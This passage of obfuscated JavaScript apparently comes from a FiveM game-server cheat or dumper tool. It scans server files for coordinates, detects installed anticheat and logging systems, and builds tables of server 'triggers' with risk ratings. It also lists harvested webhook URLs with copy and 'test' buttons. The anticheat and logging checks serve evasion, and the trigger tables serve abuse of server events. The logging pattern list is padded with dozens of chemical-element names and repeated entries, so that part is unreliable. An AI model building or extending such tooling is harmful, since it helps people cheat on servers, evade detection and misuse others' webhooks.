          const _0x2b5230 = [/vec4\s*\(\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*\)/g, /vector4\s*\(\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*\)/g, /Vector4\s*\(\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*\)/g];
          _0x2b5230.forEach(_0x2970fb => {
            let _0x864482;
            while ((_0x864482 = _0x2970fb.exec(_0x5d0c06)) !== null) {
              const _0x2ec232 = parseFloat(_0x864482[0x1]);
              const _0x199238 = parseFloat(_0x864482[0x2]);
              const _0x7de187 = parseFloat(_0x864482[0x3]);
              const _0xb7dc3e = parseFloat(_0x864482[0x4]);
              let _0x55444f = null;
              if (_0x5e2efc) {
                const _0x3b50e7 = Math.max(0x0, _0x13d9e3 - 0xa);
                const _0x530886 = Math.min(_0x3f0401.length, _0x13d9e3 + 0xa);
                const _0x5dfd4f = _0x3f0401.slice(_0x3b50e7, _0x530886).join(" ").toLowerCase();
                for (const _0x45ff08 of _0x2ae4f7) {
                  if (_0x5dfd4f.includes(_0x45ff08)) {
                    _0x55444f = _0x45ff08;
                    break;
                  }
                }
              }
              _0x31328a.push({
                'type': "vec4",
                'x': _0x2ec232,
                'y': _0x199238,
                'z': _0x7de187,
                'w': _0xb7dc3e,
                'coordinates': "vec4(" + _0x2ec232 + ", " + _0x199238 + ", " + _0x7de187 + ", " + _0xb7dc3e + ')',
                'resource': _0x4ba926,
                'file': _0x2d4d27,
                'line': _0x13d9e3 + 0x1,
                'nearItem': _0x55444f,
                'fullLine': _0x5d0c06.trim()
              });
            }
          });
        }
        const _0x8cb0c2 = [/\[\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*\]/g, /{\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*,\s*([-+]?\d*\.?\d+)\s*}/g];
        _0x8cb0c2.forEach(_0x40810d => {
          let _0x116b4f;
          while ((_0x116b4f = _0x40810d.exec(_0x5d0c06)) !== null) {
            const _0x11d71a = parseFloat(_0x116b4f[0x1]);
            const _0x188382 = parseFloat(_0x116b4f[0x2]);
            const _0x31c371 = parseFloat(_0x116b4f[0x3]);
            let _0x5399aa = null;
            if (_0x5e2efc) {
              const _0x3d625b = Math.max(0x0, _0x13d9e3 - 0xa);
              const _0x1692fb = Math.min(_0x3f0401.length, _0x13d9e3 + 0xa);
              const _0x34dfed = _0x3f0401.slice(_0x3d625b, _0x1692fb).join(" ").toLowerCase();
              for (const _0x45a756 of _0x2ae4f7) {
                if (_0x34dfed.includes(_0x45a756)) {
                  _0x5399aa = _0x45a756;
                  break;
                }
              }
            }
            _0x31328a.push({
              'type': "array",
              'x': _0x11d71a,
              'y': _0x188382,
              'z': _0x31c371,
              'w': null,
              'coordinates': '[' + _0x11d71a + ", " + _0x188382 + ", " + _0x31c371 + ']',
              'resource': _0x4ba926,
              'file': _0x2d4d27,
              'line': _0x13d9e3 + 0x1,
              'nearItem': _0x5399aa,
              'fullLine': _0x5d0c06.trim()
            });
          }
        });
      } catch (_0xbe4120) {
        console.error("Error processing coordinate line:", _0xbe4120);
      }
    }
    return _0x31328a;
  } catch (_0xe7cdc) {
    console.error("Error scanning file for coordinates:", _0xe7cdc);
    return [];
  }
}
function scanFileForAnticheat(_0x5cf4cf, _0xd974d6) {
  try {
    const _0x149753 = _0xd974d6.toLowerCase().includes("fxmanifest.lua") || _0xd974d6.toLowerCase().includes("__resource.lua");
    const _0x73cf24 = [{
      'pattern': /electronac/i,
      'name': "ElectronAC",
      'manifest': true
    }, {
      'pattern': /fiveguard/i,
      'name': "FiveGuard",
      'manifest': true
    }, {
      'pattern': /finiac/i,
      'name': "FiniAC",
      'manifest': true
    }, {
      'pattern': /reaper/i,
      'name': "Reaper",
      'manifest': true
    }, {
      'pattern': /reaperpro/i,
      'name': "ReaperPro",
      'manifest': true
    }, {
      'pattern': /novac/i,
      'name': "NovaC",
      'manifest': true
    }, {
      'pattern': /badger/i,
      'name': "Badger",
      'manifest': true
    }, {
      'pattern': /cheatbuster/i,
      'name': 'CheatBuster',
      'manifest': true
    }, {
      'pattern': /easyadmin/i,
      'name': "EasyAdmin",
      'manifest': true
    }, {
      'pattern': /anticheat/i,
      'name': "Generic Anticheat",
      'manifest': true
    }, {
      'pattern': /ac_/i,
      'name': "AC System",
      'manifest': true
    }, {
      'pattern': /anticheat_/i,
      'name': "Anticheat System",
      'manifest': true
    }, {
      'pattern': /guardian/i,
      'name': "Guardian",
      'manifest': true
    }, {
      'pattern': /shield/i,
      'name': "Shield",
      'manifest': true
    }, {
      'pattern': /protector/i,
      'name': "Protector",
      'manifest': true
    }, {
      'pattern': /defender/i,
      'name': "Defender",
      'manifest': true
    }, {
      'pattern': /sentinel/i,
      'name': 'Sentinel',
      'manifest': true
    }, {
      'pattern': /watchdog/i,
      'name': "Watchdog",
      'manifest': true
    }, {
      'pattern': /guard/i,
      'name': "Guard",
      'manifest': true
    }, {
      'pattern': /secure/i,
      'name': 'Secure',
      'manifest': true
    }, {
      'pattern': /safeguard/i,
      'name': "Safeguard",
      'manifest': true
    }, {
      'pattern': /shieldac/i,
      'name': "ShieldAC",
      'manifest': true
    }, {
      'pattern': /guardac/i,
      'name': 'GuardAC',
      'manifest': true
    }, {
      'pattern': /secureac/i,
      'name': 'SecureAC',
      'manifest': true
    }, {
      'pattern': /defenderac/i,
      'name': "DefenderAC",
      'manifest': true
    }, {
      'pattern': /sentinelac/i,
      'name': "SentinelAC",
      'manifest': true
    }, {
      'pattern': /watchdogac/i,
      'name': "WatchdogAC",
      'manifest': true
    }, {
      'pattern': /protectorac/i,
      'name': "ProtectorAC",
      'manifest': true
    }, {
      'pattern': /safeguardac/i,
      'name': 'SafeguardAC',
      'manifest': true
    }, {
      'pattern': /guardianac/i,
      'name': 'GuardianAC',
      'manifest': true
    }, {
      'pattern': /shieldguard/i,
      'name': 'ShieldGuard',
      'manifest': true
    }, {
      'pattern': /secureguard/i,
      'name': "SecureGuard",
      'manifest': true
    }, {
      'pattern': /defenderguard/i,
      'name': "DefenderGuard",
      'manifest': true
    }, {
      'pattern': /sentinelguard/i,
      'name': "SentinelGuard",
      'manifest': true
    }, {
      'pattern': /watchdogguard/i,
      'name': "WatchdogGuard",
      'manifest': true
    }, {
      'pattern': /protectorguard/i,
      'name': "ProtectorGuard",
      'manifest': true
    }, {
      'pattern': /safeguardguard/i,
      'name': "SafeguardGuard",
      'manifest': true
    }, {
      'pattern': /guardianacguard/i,
      'name': 'GuardianACGuard',
      'manifest': true
    }, {
      'pattern': /anticheatpro/i,
      'name': "AnticheatPro",
      'manifest': true
    }, {
      'pattern': /anticheatshield/i,
      'name': "AnticheatShield",
      'manifest': true
    }, {
      'pattern': /anticheatguard/i,
      'name': 'AnticheatGuard',
      'manifest': true
    }, {
      'pattern': /anticheatdefender/i,
      'name': "AnticheatDefender",
      'manifest': true
    }, {
      'pattern': /anticheatsentinel/i,
      'name': "AnticheatSentinel",
      'manifest': true
    }, {
      'pattern': /anticheatwatchdog/i,
      'name': "AnticheatWatchdog",
      'manifest': true
    }, {
      'pattern': /anticheatprotector/i,
      'name': "AnticheatProtector",
      'manifest': true
    }, {
      'pattern': /anticheatsafeguard/i,
      'name': "AnticheatSafeguard",
      'manifest': true
    }, {
      'pattern': /anticheatguardian/i,
      'name': "AnticheatGuardian",
      'manifest': true
    }, {
      'pattern': /anticheatshieldac/i,
      'name': "AnticheatShieldAC",
      'manifest': true
    }, {
      'pattern': /anticheatguardac/i,
      'name': "AnticheatGuardAC",
      'manifest': true
    }, {
      'pattern': /anticheatsecureac/i,
      'name': "AnticheatSecureAC",
      'manifest': true
    }, {
      'pattern': /anticheatdefenderac/i,
      'name': "AnticheatDefenderAC",
      'manifest': true
    }, {
      'pattern': /anticheatsentinelac/i,
      'name': 'AnticheatSentinelAC',
      'manifest': true
    }, {
      'pattern': /anticheatwatchdogac/i,
      'name': 'AnticheatWatchdogAC',
      'manifest': true
    }, {
      'pattern': /anticheatprotectorac/i,
      'name': "AnticheatProtectorAC",
      'manifest': true
    }, {
      'pattern': /anticheatsafeguardac/i,
      'name': 'AnticheatSafeguardAC',
      'manifest': true
    }, {
      'pattern': /anticheatguardianac/i,
      'name': "AnticheatGuardianAC",
      'manifest': true
    }, {
      'pattern': /dependencies\s*=\s*{[^}]*electronac[^}]*}/i,
      'name': "ElectronAC (Dependency)",
      'manifest': true
    }, {
      'pattern': /dependencies\s*=\s*{[^}]*fiveguard[^}]*}/i,
      'name': "FiveGuard (Dependency)",
      'manifest': true
    }, {
      'pattern': /dependencies\s*=\s*{[^}]*finiac[^}]*}/i,
      'name': "FiniAC (Dependency)",
      'manifest': true
    }, {
      'pattern': /dependencies\s*=\s*{[^}]*reaper[^}]*}/i,
      'name': "Reaper (Dependency)",
      'manifest': true
    }, {
      'pattern': /dependencies\s*=\s*{[^}]*novac[^}]*}/i,
      'name': "NovaC (Dependency)",
      'manifest': true
    }, {
      'pattern': /dependencies\s*=\s*{[^}]*badger[^}]*}/i,
      'name': "Badger (Dependency)",
      'manifest': true
    }, {
      'pattern': /dependencies\s*=\s*{[^}]*cheatbuster[^}]*}/i,
      'name': "CheatBuster (Dependency)",
      'manifest': true
    }, {
      'pattern': /dependencies\s*=\s*{[^}]*easyadmin[^}]*}/i,
      'name': "EasyAdmin (Dependency)",
      'manifest': true
    }, {
      'pattern': /dependencies\s*=\s*{[^}]*anticheat[^}]*}/i,
      'name': "Generic Anticheat (Dependency)",
      'manifest': true
    }, {
      'pattern': /server_scripts\s*=\s*{[^}]*electronac[^}]*}/i,
      'name': "ElectronAC (Server Script)",
      'manifest': true
    }, {
      'pattern': /server_scripts\s*=\s*{[^}]*fiveguard[^}]*}/i,
      'name': "FiveGuard (Server Script)",
      'manifest': true
    }, {
      'pattern': /server_scripts\s*=\s*{[^}]*finiac[^}]*}/i,
      'name': "FiniAC (Server Script)",
      'manifest': true
    }, {
      'pattern': /server_scripts\s*=\s*{[^}]*reaper[^}]*}/i,
      'name': "Reaper (Server Script)",
      'manifest': true
    }, {
      'pattern': /server_scripts\s*=\s*{[^}]*novac[^}]*}/i,
      'name': "NovaC (Server Script)",
      'manifest': true
    }, {
      'pattern': /server_scripts\s*=\s*{[^}]*badger[^}]*}/i,
      'name': "Badger (Server Script)",
      'manifest': true
    }, {
      'pattern': /server_scripts\s*=\s*{[^}]*cheatbuster[^}]*}/i,
      'name': "CheatBuster (Server Script)",
      'manifest': true
    }, {
      'pattern': /server_scripts\s*=\s*{[^}]*easyadmin[^}]*}/i,
      'name': "EasyAdmin (Server Script)",
      'manifest': true
    }, {
      'pattern': /server_scripts\s*=\s*{[^}]*anticheat[^}]*}/i,
      'name': "Generic Anticheat (Server Script)",
      'manifest': true
    }, {
      'pattern': /client_scripts\s*=\s*{[^}]*electronac[^}]*}/i,
      'name': "ElectronAC (Client Script)",
      'manifest': true
    }, {
      'pattern': /client_scripts\s*=\s*{[^}]*fiveguard[^}]*}/i,
      'name': "FiveGuard (Client Script)",
      'manifest': true
    }, {
      'pattern': /client_scripts\s*=\s*{[^}]*finiac[^}]*}/i,
      'name': "FiniAC (Client Script)",
      'manifest': true
    }, {
      'pattern': /client_scripts\s*=\s*{[^}]*reaper[^}]*}/i,
      'name': "Reaper (Client Script)",
      'manifest': true
    }, {
      'pattern': /client_scripts\s*=\s*{[^}]*novac[^}]*}/i,
      'name': "NovaC (Client Script)",
      'manifest': true
    }, {
      'pattern': /client_scripts\s*=\s*{[^}]*badger[^}]*}/i,
      'name': "Badger (Client Script)",
      'manifest': true
    }, {
      'pattern': /client_scripts\s*=\s*{[^}]*cheatbuster[^}]*}/i,
      'name': "CheatBuster (Client Script)",
      'manifest': true
    }, {
      'pattern': /client_scripts\s*=\s*{[^}]*easyadmin[^}]*}/i,
      'name': "EasyAdmin (Client Script)",
      'manifest': true
    }, {
      'pattern': /client_scripts\s*=\s*{[^}]*anticheat[^}]*}/i,
      'name': "Generic Anticheat (Client Script)",
      'manifest': true
    }, {
      'pattern': /electronac/i,
      'name': "ElectronAC",
      'manifest': false
    }, {
      'pattern': /fiveguard/i,
      'name': "FiveGuard",
      'manifest': false
    }, {
      'pattern': /finiac/i,
      'name': "FiniAC",
      'manifest': false
    }, {
      'pattern': /reaper/i,
      'name': "Reaper",
      'manifest': false
    }, {
      'pattern': /reaperpro/i,
      'name': "ReaperPro",
      'manifest': false
    }, {
      'pattern': /novac/i,
      'name': "NovaC",
      'manifest': false
    }, {
      'pattern': /badger/i,
      'name': "Badger",
      'manifest': false
    }, {
      'pattern': /cheatbuster/i,
      'name': "CheatBuster",
      'manifest': false
    }, {
      'pattern': /easyadmin/i,
      'name': 'EasyAdmin',
      'manifest': false
    }, {
      'pattern': /anticheat/i,
      'name': "Generic Anticheat",
      'manifest': false
    }, {
      'pattern': /ac_/i,
      'name': "AC System",
      'manifest': false
    }, {
      'pattern': /anticheat_/i,
      'name': "Anticheat System",
      'manifest': false
    }, {
      'pattern': /guardian/i,
      'name': "Guardian",
      'manifest': false
    }, {
      'pattern': /shield/i,
      'name': 'Shield',
      'manifest': false
    }, {
      'pattern': /protector/i,
      'name': "Protector",
      'manifest': false
    }, {
      'pattern': /defender/i,
      'name': "Defender",
      'manifest': false
    }, {
      'pattern': /sentinel/i,
      'name': "Sentinel",
      'manifest': false
    }, {
      'pattern': /watchdog/i,
      'name': "Watchdog",
      'manifest': false
    }, {
      'pattern': /guard/i,
      'name': 'Guard',
      'manifest': false
    }, {
      'pattern': /secure/i,
      'name': "Secure",
      'manifest': false
    }, {
      'pattern': /safeguard/i,
      'name': "Safeguard",
      'manifest': false
    }];
    for (const _0x34d252 of _0x73cf24) {
      if (_0x149753 && _0x34d252.manifest && _0x34d252.pattern.test(_0x5cf4cf)) {
        return _0x34d252.name;
      } else {
        if (!_0x149753 && !_0x34d252.manifest && _0x34d252.pattern.test(_0x5cf4cf)) {
          return _0x34d252.name;
        }
      }
    }
    return null;
  } catch (_0x2b2cec) {
    console.error("Error scanning file for anticheat:", _0x2b2cec);
    return null;
  }
}
function scanFileForLogs(_0x28e88f, _0x4b1f1f) {
  try {
    const _0x3485d1 = [{
      'pattern': /JD_logs/i,
      'name': "JD Logs"
    }, {
      'pattern': /esx_logs/i,
      'name': "ESX Logs"
    }, {
      'pattern': /qb-logs/i,
      'name': "QB-Logs"
    }, {
      'pattern': /ox_lib/i,
      'name': "OX Lib"
    }, {
      'pattern': /ox_logs/i,
      'name': "OX Logs"
    }, {
      'pattern': /ox_logging/i,
      'name': "OX Logging"
    }, {
      'pattern': /logging/i,
      'name': "Generic Logging"
    }, {
      'pattern': /log_/i,
      'name': "Log System"
    }, {
      'pattern': /logs_/i,
      'name': "Logs System"
    }, {
      'pattern': /discord_logs/i,
      'name': "Discord Logs"
    }, {
      'pattern': /webhook_logs/i,
      'name': "Webhook Logs"
    }, {
      'pattern': /telegram_logs/i,
      'name': "Telegram Logs"
    }, {
      'pattern': /slack_logs/i,
      'name': "Slack Logs"
    }, {
      'pattern': /email_logs/i,
      'name': "Email Logs"
    }, {
      'pattern': /database_logs/i,
      'name': "Database Logs"
    }, {
      'pattern': /file_logs/i,
      'name': "File Logs"
    }, {
      'pattern': /console_logs/i,
      'name': "Console Logs"
    }, {
      'pattern': /server_logs/i,
      'name': "Server Logs"
    }, {
      'pattern': /client_logs/i,
      'name': "Client Logs"
    }, {
      'pattern': /admin_logs/i,
      'name': "Admin Logs"
    }, {
      'pattern': /player_logs/i,
      'name': "Player Logs"
    }, {
      'pattern': /action_logs/i,
      'name': "Action Logs"
    }, {
      'pattern': /event_logs/i,
      'name': "Event Logs"
    }, {
      'pattern': /security_logs/i,
      'name': "Security Logs"
    }, {
      'pattern': /audit_logs/i,
      'name': "Audit Logs"
    }, {
      'pattern': /activity_logs/i,
      'name': "Activity Logs"
    }, {
      'pattern': /system_logs/i,
      'name': "System Logs"
    }, {
      'pattern': /error_logs/i,
      'name': "Error Logs"
    }, {
      'pattern': /warning_logs/i,
      'name': "Warning Logs"
    }, {
      'pattern': /info_logs/i,
      'name': "Info Logs"
    }, {
      'pattern': /debug_logs/i,
      'name': "Debug Logs"
    }, {
      'pattern': /trace_logs/i,
      'name': "Trace Logs"
    }, {
      'pattern': /verbose_logs/i,
      'name': "Verbose Logs"
    }, {
      'pattern': /detailed_logs/i,
      'name': "Detailed Logs"
    }, {
      'pattern': /comprehensive_logs/i,
      'name': "Comprehensive Logs"
    }, {
      'pattern': /advanced_logs/i,
      'name': "Advanced Logs"
    }, {
      'pattern': /professional_logs/i,
      'name': "Professional Logs"
    }, {
      'pattern': /enterprise_logs/i,
      'name': "Enterprise Logs"
    }, {
      'pattern': /premium_logs/i,
      'name': "Premium Logs"
    }, {
      'pattern': /ultimate_logs/i,
      'name': "Ultimate Logs"
    }, {
      'pattern': /master_logs/i,
      'name': "Master Logs"
    }, {
      'pattern': /expert_logs/i,
      'name': "Expert Logs"
    }, {
      'pattern': /pro_logs/i,
      'name': "Pro Logs"
    }, {
      'pattern': /elite_logs/i,
      'name': "Elite Logs"
    }, {
      'pattern': /supreme_logs/i,
      'name': "Supreme Logs"
    }, {
      'pattern': /perfect_logs/i,
      'name': "Perfect Logs"
    }, {
      'pattern': /flawless_logs/i,
      'name': "Flawless Logs"
    }, {
      'pattern': /immaculate_logs/i,
      'name': "Immaculate Logs"
    }, {
      'pattern': /pristine_logs/i,
      'name': "Pristine Logs"
    }, {
      'pattern': /spotless_logs/i,
      'name': "Spotless Logs"
    }, {
      'pattern': /clean_logs/i,
      'name': "Clean Logs"
    }, {
      'pattern': /pure_logs/i,
      'name': "Pure Logs"
    }, {
      'pattern': /crystal_logs/i,
      'name': "Crystal Logs"
    }, {
      'pattern': /diamond_logs/i,
      'name': "Diamond Logs"
    }, {
      'pattern': /platinum_logs/i,
      'name': "Platinum Logs"
    }, {
      'pattern': /gold_logs/i,
      'name': "Gold Logs"
    }, {
      'pattern': /silver_logs/i,
      'name': "Silver Logs"
    }, {
      'pattern': /bronze_logs/i,
      'name': "Bronze Logs"
    }, {
      'pattern': /copper_logs/i,
      'name': "Copper Logs"
    }, {
      'pattern': /iron_logs/i,
      'name': "Iron Logs"
    }, {
      'pattern': /steel_logs/i,
      'name': "Steel Logs"
    }, {
      'pattern': /titanium_logs/i,
      'name': "Titanium Logs"
    }, {
      'pattern': /aluminum_logs/i,
      'name': "Aluminum Logs"
    }, {
      'pattern': /magnesium_logs/i,
      'name': "Magnesium Logs"
    }, {
      'pattern': /zinc_logs/i,
      'name': "Zinc Logs"
    }, {
      'pattern': /nickel_logs/i,
      'name': "Nickel Logs"
    }, {
      'pattern': /cobalt_logs/i,
      'name': "Cobalt Logs"
    }, {
      'pattern': /chromium_logs/i,
      'name': "Chromium Logs"
    }, {
      'pattern': /manganese_logs/i,
      'name': "Manganese Logs"
    }, {
      'pattern': /molybdenum_logs/i,
      'name': "Molybdenum Logs"
    }, {
      'pattern': /tungsten_logs/i,
      'name': "Tungsten Logs"
    }, {
      'pattern': /vanadium_logs/i,
      'name': "Vanadium Logs"
    }, {
      'pattern': /niobium_logs/i,
      'name': "Niobium Logs"
    }, {
      'pattern': /tantalum_logs/i,
      'name': "Tantalum Logs"
    }, {
      'pattern': /hafnium_logs/i,
      'name': "Hafnium Logs"
    }, {
      'pattern': /rhenium_logs/i,
      'name': "Rhenium Logs"
    }, {
      'pattern': /osmium_logs/i,
      'name': "Osmium Logs"
    }, {
      'pattern': /iridium_logs/i,
      'name': "Iridium Logs"
    }, {
      'pattern': /platinum_logs/i,
      'name': "Platinum Logs"
    }, {
      'pattern': /gold_logs/i,
      'name': "Gold Logs"
    }, {
      'pattern': /mercury_logs/i,
      'name': "Mercury Logs"
    }, {
      'pattern': /thallium_logs/i,
      'name': "Thallium Logs"
    }, {
      'pattern': /lead_logs/i,
      'name': "Lead Logs"
    }, {
      'pattern': /bismuth_logs/i,
      'name': "Bismuth Logs"
    }, {
      'pattern': /polonium_logs/i,
      'name': "Polonium Logs"
    }, {
      'pattern': /astatine_logs/i,
      'name': "Astatine Logs"
    }, {
      'pattern': /radon_logs/i,
      'name': "Radon Logs"
    }, {
      'pattern': /francium_logs/i,
      'name': "Francium Logs"
    }, {
      'pattern': /radium_logs/i,
      'name': "Radium Logs"
    }, {
      'pattern': /actinium_logs/i,
      'name': "Actinium Logs"
    }, {
      'pattern': /thorium_logs/i,
      'name': "Thorium Logs"
    }, {
      'pattern': /protactinium_logs/i,
      'name': "Protactinium Logs"
    }, {
      'pattern': /uranium_logs/i,
      'name': "Uranium Logs"
    }, {
      'pattern': /neptunium_logs/i,
      'name': "Neptunium Logs"
    }, {
      'pattern': /plutonium_logs/i,
      'name': "Plutonium Logs"
    }, {
      'pattern': /americium_logs/i,
      'name': "Americium Logs"
    }, {
      'pattern': /curium_logs/i,
      'name': "Curium Logs"
    }, {
      'pattern': /berkelium_logs/i,
      'name': "Berkelium Logs"
    }, {
      'pattern': /californium_logs/i,
      'name': "Californium Logs"
    }, {
      'pattern': /einsteinium_logs/i,
      'name': "Einsteinium Logs"
    }, {
      'pattern': /fermium_logs/i,
      'name': "Fermium Logs"
    }, {
      'pattern': /mendelevium_logs/i,
      'name': "Mendelevium Logs"
    }, {
      'pattern': /nobelium_logs/i,
      'name': "Nobelium Logs"
    }, {
      'pattern': /lawrencium_logs/i,
      'name': "Lawrencium Logs"
    }, {
      'pattern': /rutherfordium_logs/i,
      'name': "Rutherfordium Logs"
    }, {
      'pattern': /dubnium_logs/i,
      'name': "Dubnium Logs"
    }, {
      'pattern': /seaborgium_logs/i,
      'name': "Seaborgium Logs"
    }, {
      'pattern': /bohrium_logs/i,
      'name': "Bohrium Logs"
    }, {
      'pattern': /hassium_logs/i,
      'name': "Hassium Logs"
    }, {
      'pattern': /meitnerium_logs/i,
      'name': "Meitnerium Logs"
    }, {
      'pattern': /darmstadtium_logs/i,
      'name': "Darmstadtium Logs"
    }, {
      'pattern': /roentgenium_logs/i,
      'name': "Roentgenium Logs"
    }, {
      'pattern': /copernicium_logs/i,
      'name': "Copernicium Logs"
    }, {
      'pattern': /nihonium_logs/i,
      'name': "Nihonium Logs"
    }, {
      'pattern': /flerovium_logs/i,
      'name': "Flerovium Logs"
    }, {
      'pattern': /moscovium_logs/i,
      'name': "Moscovium Logs"
    }, {
      'pattern': /livermorium_logs/i,
      'name': "Livermorium Logs"
    }, {
      'pattern': /tennessine_logs/i,
      'name': "Tennessine Logs"
    }, {
      'pattern': /oganesson_logs/i,
      'name': "Oganesson Logs"
    }];
    for (const _0x559d19 of _0x3485d1) {
      if (_0x559d19.pattern.test(_0x28e88f)) {
        return _0x559d19.name;
      }
    }
    return null;
  } catch (_0x4c8d65) {
    console.error("Error scanning file for logs:", _0x4c8d65);
    return null;
  }
}
function getLineNumber(_0x5c2c65, _0x39493d) {
  try {
    const _0x2cc79d = _0x5c2c65.substring(0x0, _0x39493d);
    return _0x2cc79d.split("\n").length;
  } catch (_0x570943) {
    console.error("Error getting line number:", _0x570943);
    return 0x0;
  }
}
function updateTriggersTable(_0x54f9bb) {
  try {
    const _0x2f211b = document.getElementById("triggers-tbody");
    if (!_0x2f211b) {
      return;
    }
    _0x2f211b.innerHTML = '';
    _0x54f9bb.forEach((_0x13f177, _0x1783ec) => {
      const _0x5a58d1 = document.createElement('tr');
      _0x5a58d1.setAttribute('data-trigger-usage', _0x13f177.usage);
      _0x5a58d1.setAttribute('data-trigger-resource', _0x13f177.resource);
      _0x5a58d1.setAttribute("data-trigger-risk", _0x13f177.risk);
      _0x5a58d1.setAttribute('data-trigger-file', _0x13f177.file || '');
      _0x5a58d1.setAttribute('data-trigger-line', _0x13f177.line || 0x0);
      _0x5a58d1.innerHTML = "\n                <td>" + _0x13f177.resource + "</td>\n                <td style=\"max-width: 400px; word-wrap: break-word; font-family: 'Courier New', monospace; font-size: 12px;\">" + _0x13f177.usage + "</td>\n                <td>\n                    <span style=\"padding: 4px 8px; border-radius: 4px; font-size: 12px; background: #27ae60; color: white;\">\n                        " + _0x13f177.status + "\n                    </span>\n                </td>\n                <td>\n                    <span style=\"padding: 4px 8px; border-radius: 4px; font-size: 12px; background: #667eea; color: white;\">\n                        " + _0x13f177.risk + "\n                    </span>\n                </td>\n                <td>\n                    <button class=\"copy-trigger-btn\" data-index=\"" + _0x1783ec + "\" style=\"padding: 4px 8px; background: #667eea; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; margin-right: 5px;\" title=\"Copy to Clipboard\">\n                        <i class=\"fas fa-copy\"></i>\n                    </button>\n                    <button class=\"transfer-trigger-btn\" data-index=\"" + _0x1783ec + "\" style=\"padding: 4px 8px; background: #f39c12; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; margin-right: 5px;\" title=\"Transfer to Editor\">\n                        <i class=\"fas fa-edit\"></i>\n                    </button>\n                    <button class=\"preview-trigger-btn\" data-index=\"" + _0x1783ec + "\" style=\"padding: 4px 8px; background: #27ae60; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; margin-right: 5px;\" title=\"Open in Preview\">\n                        <i class=\"fas fa-eye\"></i>\n                    </button>\n                    <button class=\"save-trigger-btn\" data-index=\"" + _0x1783ec + "\" style=\"padding: 4px 8px; background: #8b5cf6; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px;\" title=\"Save Trigger\">\n                        <i class=\"fas fa-bookmark\"></i>\n                    </button>\n                </td>\n            ";
      const _0x13a215 = _0x5a58d1.querySelector(".copy-trigger-btn");
      const _0xde5347 = _0x5a58d1.querySelector('.transfer-trigger-btn');
      const _0x535258 = _0x5a58d1.querySelector('.preview-trigger-btn');
      const _0x5e6ea7 = _0x5a58d1.querySelector(".save-trigger-btn");
      _0x13a215.addEventListener("click", () => {
        copyTrigger(_0x13f177.usage);
      });
      _0xde5347.addEventListener("click", () => {
        transferToEditor(_0x13f177.usage, _0x13f177.resource);
      });
      _0x535258.addEventListener("click", () => {
        openTriggerPreview(_0x13f177.resource, _0x13f177.file || '', _0x13f177.line || 0x0);
      });
      _0x5e6ea7.addEventListener('click', () => {
        saveTrigger(_0x13f177.resource, _0x13f177.usage, _0x13f177.risk);
      });
      _0x2f211b.appendChild(_0x5a58d1);
    });
  } catch (_0x543266) {
    console.error("Error updating triggers table:", _0x543266);
  }
}
function updateWebhooksTable(_0x52ee23) {
  try {
    const _0xb1fe98 = document.getElementById("webhooks-tbody");
    const _0x3b5659 = document.getElementById("webhooks-empty");
    if (!_0xb1fe98) {
      return;
    }
    _0xb1fe98.innerHTML = '';
    if (_0x52ee23.length === 0x0) {
      if (_0x3b5659) {
        _0x3b5659.style.display = 'flex';
      }
      return;
    }
    if (_0x3b5659) {
      _0x3b5659.style.display = 'none';
    }
    _0x52ee23.forEach((_0x1ae835, _0x4304be) => {
      const _0x1c87c8 = document.createElement('tr');
      const _0x19bc3c = appState.selectedWebhooks.includes(_0x1ae835.url);
      _0x1c87c8.setAttribute("data-webhook-url", _0x1ae835.url);
      _0x1c87c8.setAttribute("data-webhook-resource", _0x1ae835.resource);
      _0x1c87c8.setAttribute("data-webhook-file", _0x1ae835.file || '');
      _0x1c87c8.setAttribute('data-webhook-line', _0x1ae835.line || 0x1);
      _0x1c87c8.innerHTML = "\n                <td>\n                    <input type=\"checkbox\" class=\"webhook-checkbox\" data-url=\"" + _0x1ae835.url + "\" " + (_0x19bc3c ? 'checked' : '') + ">\n                </td>\n                <td>" + _0x1ae835.resource + "</td>\n                <td>" + _0x1ae835.url + "</td>\n                <td>\n                    <span id=\"webhook-status-" + _0x4304be + "\" style=\"padding: 4px 8px; border-radius: 4px; font-size: 12px; background: #8b9dc3; color: white;\">\n                        Testing...\n                    </span>\n                </td>\n                <td>\n                    <button class=\"copy-webhook-btn\" data-index=\"" + _0x4304be + "\" style=\"padding: 4px 8px; background: #667eea; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; margin-right: 5px;\" title=\"Copy to Clipboard\">\n                        <i class=\"fas fa-copy\"></i>\n                    </button>\n                    <button class=\"preview-webhook-btn\" data-index=\"" + _0x4304be + "\" style=\"padding: 4px 8px; background: #f39c12; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; margin-right: 5px;\" title=\"Open in Preview\">\n                        <i class=\"fas fa-eye\"></i>\n                    </button>\n                    <button class=\"test-webhook-btn\" data-index=\"" + _0x4304be + "\" style=\"padding: 4px 8px; background: #27ae60; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px;\" title=\"Test Webhook\">\n                        <i class=\"fas fa-paper-plane\"></i>\n                    </button>\n                </td>\n            ";
      const _0x256dad = _0x1c87c8.querySelector(".copy-webhook-btn");
      const _0x1a0700 = _0x1c87c8.querySelector(".preview-webhook-btn");
      const _0x1fdffa = _0x1c87c8.querySelector(".test-webhook-btn");
      _0x256dad.addEventListener("click", () => {
        copyWebhook(_0x1ae835.url);
      });
      _0x1a0700.addEventListener('click', () => {
        openWebhookPreview(_0x1ae835.url, _0x1ae835.resource, _0x1ae835.file || '', _0x1ae835.line || 0x1);
      });
      _0x1fdffa.addEventListener("click", () => {
        testWebhook(_0x1ae835.url);
      });
      const _0x16aa73 = _0x1c87c8.querySelector('.webhook-checkbox');
      _0x16aa73.addEventListener("change", _0x36f0eb => {
